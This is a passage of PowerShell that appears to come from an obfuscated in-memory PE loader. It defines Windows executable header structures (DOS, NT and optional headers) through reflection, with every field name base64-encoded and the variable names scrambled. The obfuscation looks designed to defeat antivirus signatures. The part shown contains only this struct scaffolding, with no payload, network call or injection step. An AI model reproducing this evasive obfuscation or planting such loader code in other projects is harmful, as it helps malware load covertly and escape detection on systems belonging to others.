		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(224) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(232) | Out-Null
		${____/\__/=\/=\/\/} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value ${____/\__/=\/=\/\/}
		${_/=\_/\___/=\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIAMwAyAA=='))), ${_/=\_/\___/=\_/=\}, [System.ValueType], 224)
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${_____/=\____/\/\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(28) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${__/==\_/\_/=\__/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${___/\___/====\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(76) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(84) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(92) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		${/=\/\_/\/\______/} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value ${/=\/\_/\/\______/}
		${_/=\_/\___/=\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwA2ADQA'))), ${_/=\_/\___/=\_/=\}, [System.ValueType], 264)
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${___/==\__/=\/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${____/\__/=\/=\/\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\/=========\___} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value ${_/\/=========\___}
		${_/=\_/\___/=\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwAzADIA'))), ${_/=\_/\___/=\_/=\}, [System.ValueType], 248)
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${___/==\__/=\/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${/=\/\_/\/\______/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\/=\/==\_/\__/=} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value ${_/\/=\/==\_/\__/=}
		${_/=\_/\___/=\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABPAFMAXwBIAEUAQQBEAEUAUgA='))), ${_/=\_/\___/=\_/=\}, [System.ValueType], 64)
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQBnAGkAYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAYgBsAHAA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcgBsAGMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcABhAHIAaABkAHIA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AaQBuAGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQB4AGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwB1AG0A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGkAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAHIAbABjAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AdgBuAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=======\_/\_/=\_} = ${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzAA=='))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${__/\_/=\__/=\__/=} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
